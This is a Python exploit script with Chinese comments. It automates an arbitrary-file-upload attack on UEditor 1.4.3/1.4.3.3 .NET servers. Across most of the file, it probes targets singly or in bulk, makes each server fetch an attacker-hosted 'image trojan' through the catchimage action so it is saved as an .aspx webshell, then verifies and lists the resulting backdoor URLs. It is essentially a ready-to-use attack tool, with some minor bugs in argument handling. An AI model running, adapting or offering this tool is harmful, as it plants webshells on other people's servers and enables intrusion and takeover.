import getopt
import os
import sys

import requests
from requests import exceptions
from termcolor import cprint
from urllib.parse import urlparse

banner = r'''
       _______          ____  ______  
  ____ \   _  \    ____/_   |/  __  \ 
_/ __ \/  /_\  \  / ___\|   |>      < 
\  ___/\  \_/   \/ /_/  >   /   --   \
 \___  >\_____  /\___  /|___\______  /
     \/       \//_____/            \/ 
'''

help_text = '''
利用上传漏洞自动攻击ueditor(V1.4.3/V1.4.3.3)服务器，获得shell
usage: python3.9 [-h help[:options]] [[-q quiet[:options]]] [-t target_url] [-s image_shell]
    -h  help            打印帮助信息，不能与-q同时使用
    -q  quiet           不打印任何信息，不能与-h同时使用
    -t  target_url      目标服务器url地址(如果不指定-f file参数，必须指定该参数)
    -f  target_file     从文件中读取目标服务器地址
    -m  image_shell     指定图片木马的地址(必须指定该参数)
    -o  out_file        将webshell地址保存到指定的文件中
'''
_h = ''  # 是否打印help信息
_q = ''  # 不打印banner和help
target_url = ''  # 存在漏洞的url地址(需要自己发现)
target_urls = []  # 存在漏洞的url地址列表
target_filename = ''  # 保存目标服务器漏洞地址的文件名称
image_shell = ''  # 图片马的url地址(自己搭建一个http服务器，vps什么的)
out_filename = ''  # 保存webshell结果的文件名称
multi = False  # 多目标模式
shell_urls = []  # 获取到的webshell地址


def _print(message, color) -> None:
    r"""
    根据打印信息的级别，打印不同的颜色
    :param message: 打印内容: string
    :param color:   级别(1:黑色，2:blue，3:黄色，4:红色): int
    :return: None
    """
    if color == 0:
        cprint(message, 'green')
    elif color == 1:
        cprint(message)
    elif color == 2:
        cprint(message, 'blue')
    elif color == 3:
        cprint(message, 'yellow')
    elif color == 4:
        cprint(message, 'red')


def init() -> None:
    r"""从命令行获取信息，并传给全局变量target_url/target_filename/image_shell/out_filename
    :return: tuple
    """
    # cprint(banner, 'blue')
    global help_info
    global out_filename
    global _h
    global _q
    global _target_url
    global image_shell
    global target_filename
    # 读取终端输入的参数
    optlist, args = getopt.getopt(sys.argv[1:], 'hqt:f:m:o:',
                                  ['help', 'quiet', 'target_url', 'target_file', 'image_shell', 'out_file'])
    for k, v in optlist:
        if k in ('-h', 'help'):  # 是否打印帮助信息
            _h = "help"
            continue
        if k in ('-q', 'quiet'):
            _q = "quiet"  # 是否打印banner信息
            continue
        if k in ('-t', 'target_url'):  # 单个目标地址
            _target_url = v
            continue
        if k in ('-f', 'target_filename'):  # 指定目标文件(多个目标)
            target_filename = v
            continue
        if k in ('-m', 'image_shell'):  # 图片马地址
            image_shell = v
            continue
        if k in ('-o', 'out_filename'):  # 成功获取webshell后，保存到的文件名(默认只是打印)
            out_filename = v


def check_args() -> bool:
    r"""
    检查程序设置的参数是否设置正确
    :return: bool
    """
    global multi
    global target_urls
    if _q and _h:  # 同时设定-h和-q冲突
        _print('[-]Error -h help和 -q quiet 只能指定一个', 4)
        return False
    if not _q:  # 非安静模式，打印banner和help
        _print(banner, 2)
    if _h:  # 查看帮助
        _print(help_text, 1)
    if not target_url and not target_filename:  # 没有设置目标地址并且没有设置目标文件，就退出
        _print('[-]Error 必须执行目标服务器url，程序退出...', 4)
        return False
    if not image_shell:  # 没有指定图片马地址，就退出
        _print('[-]Error 必须指定图片马地址，程序退出...', 4)
        return False
    if image_shell == '-o':  # 终端输入-m -o shell.txt
        _print('[-]Error -m后面必须指定图片马地址，不能赋值为"-o"，参数格式设置有误，程序退出...', 4)
        return False
    if not target_filename:
        return check_url(target_url)
    elif target_filename:  # 添加目标文件中的url
        is_file = check_filename(target_filename)
        if is_file:
            with open(target_filename, 'r') as f:
                for url in f.readlines():
                    url = url.strip('\n')
                    if check_url(url):
                        multi = True
                        target_urls.append(url)
            return True
        else:
            _print('[-]Error 不存在 "' + os.path.abspath(__file__) + '/' + target_filename + '" 文件', 4)
            return False

    return True


def check_filename(filename) -> bool:
    r"""
    检查文件是否存在
    :param filename: string
    :return: bool
    """
    if os.path.exists(filename):
        return True
    else:
        return False


def check_url(url) -> str:
    r"""
    检测给定的url地址是否能正常访问(条件:状态码是否是200)
    :param url: str
    :return: bool
    """
    try:
        res = requests.get(url, timeout=(3, 6), allow_redirects=False)
        if res.status_code == 200 and res.text:
            return True
        else:
            _print('[-]Error' + url + ' 服务器不存在该资源', 4)
            return False
    except exceptions.ReadTimeout:
        _print('[-]Error url="' + url + '" 连接超时', 4)
        return False
    except exceptions.ConnectionError:
        _print('[-]Error url="' + url + '" 连接失败', 4)
        return False
    except ConnectionResetError:
        _print('[-]Error url="' + url + '" 拒绝连接', 4)
        return False
    except exceptions.MissingSchema:
        _print('[-]Error url="' + url + '" url格式错误(正确的格式:http://xx/xx.xxx)', 4)
        return False
    except BaseException as e:
        _print('[-]Error ' + e)
        return False


def get_shell(target_url, image_shell) -> str:
    r"""
    获取ueditor(1.4.3、1.4.3.3)的上传的webshell地址
    :param target_url:目标服务器地址: str
    :param image_shell:图片马地址: str
    :return: str
    """
    # 定义post请求的头部
    header = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
                      'Chrome/92.0.4515.131 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;'
                  'q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close'
    }
    # 定义post请求的body
    data = r'source[]=' + image_shell + r'?.aspx'
    if not check_url(image_shell):  # 检查图片马的可访问性
        return ''
    try:
        res = requests.post(url=target_url + r'?action=catchimage&encode=utf-8', headers=header, data=data,
                            timeout=(3, 7))
        # 上传成功，就从response中确定webshell地址
        if res.status_code == 200 and '{"state":"SUCCESS","list":[{"state":"SUCCESS","source":"' in res.text:
            res_shell_path = res.json()['list'][0]['url']  # 从json中获取webshell的尾部路径

            if not res_shell_path:  # 尾部路径为空说明没有成功，返回空字符串
                return ''
            '''
            将url处理成如下格式
            ParseResult(scheme='http',netloc='11.211.55.3:8981',path='/ueditor/net/controller.ashx',params='',query='',fragment='')
            '''
            res_parse = urlparse(target_url)
            """
            'http' + '://' + '11.211.55.3:8981' + '/ueditor/net' + '/' + 
            'upload/image/20210917/6376749817900880002810400.aspx'
            """
            shell_url = res_parse.scheme + '://' + res_parse.netloc + os.path.dirname(
                res_parse.path) + '/' + res_shell_path
            return shell_url
        else:
            _print('[-]Error POST请求发生错误', 4)
    except exceptions.ReadTimeout:
        cprint('[-]' + target_url + ' 连接超时', 'red')
        return ''
    except exceptions.ConnectionError:
        cprint('[-]' + target_url + ' 连接失败', 'red')
        return ''
    except ConnectionResetError:
        cprint('[-]' + target_url + ' 拒绝连接', 'red')
        return ''
    except BaseException as e:
        cprint('[-]' + str(e), 'red')
        return ''


def save(filename, data) -> bool:
    if check_filename(filename):
        with open(filename, 'a') as f:
            f.write(data)
            _print('[+]Success ' + out_filename + ' 写入:"' + i + '成功', 0)
            return True
    else:
        _print('[+]Error ' + out_filename + ' 写入:"' + i + '失败', 4)
        return False


def check_upload(url) -> bool:
    try:
        response = requests.get(url, timeout=(3, 6), allow_redirects=False)
        response.encoding = response.apparent_encoding  # 从内容中分析响应内容编码方式
        if response.status_code == 200 and response.text == '{"state":"action 参数为空或者 action 不被支持。"}':
            return True
        else:
            return False

    except exceptions.ConnectTimeout:
        cprint('[-]' + url + ' 连接超时', 'red')
        return False
    except exceptions.ReadTimeout:
        cprint('[-]' + url + ' 读取失败', 'red')
        return False
    except exceptions.ConnectionError:
        cprint('[-]' + url + ' 无效地址', 'red')
        return False
    except BaseException as e:
        cprint('[-]' + str(e), 'red')
        return False


def poc_upload(_target_url, _image_shell) -> str:
    if check_upload(_target_url):  # 存在漏洞，返回webshell地址
        cprint('[+]' + _target_url + ' 漏洞存在', 'green')
        shell_url = get_shell(_target_url, _image_shell)
        if not shell_url:
            return ''
        shell_urls.append(shell_url)
        return shell_url
    else:  # 不存在漏洞，返回空字符串
        cprint('[-]' + _target_url + ' 漏洞不存在', 'red')
        return ''


def poc_upload_all(_target_urls, _image_shell) -> list:
    global shell_urls
    for url in _target_urls:
        poc_upload(url, _image_shell)
    return shell_urls


if __name__ == '__main__':
    init()  # 初始化参数
    res = check_args()  # 检测参数设置
    if res and multi:  # 参数设置没有问题，并且是批量模式

        poc_upload_all(target_urls, image_shell)
    elif res and not multi:  # 单url模式
        poc_upload(target_url, image_shell)
    if out_filename and shell_urls:  # 是否保存文件
        for i in shell_urls:
            is_url = check_url(i)  # 判断webshell的有效性，有效写入文件，无效打印错误信息
            if is_url:
                save(out_filename, i + '\n')
            else:
                continue
    elif not out_filename:  # 不保存webshell地址
        for i in shell_urls:  # 循环打印webshell地址
            if check_url(i):
                _print('[+]Success 后门地址:"' + i + '" ', 0)
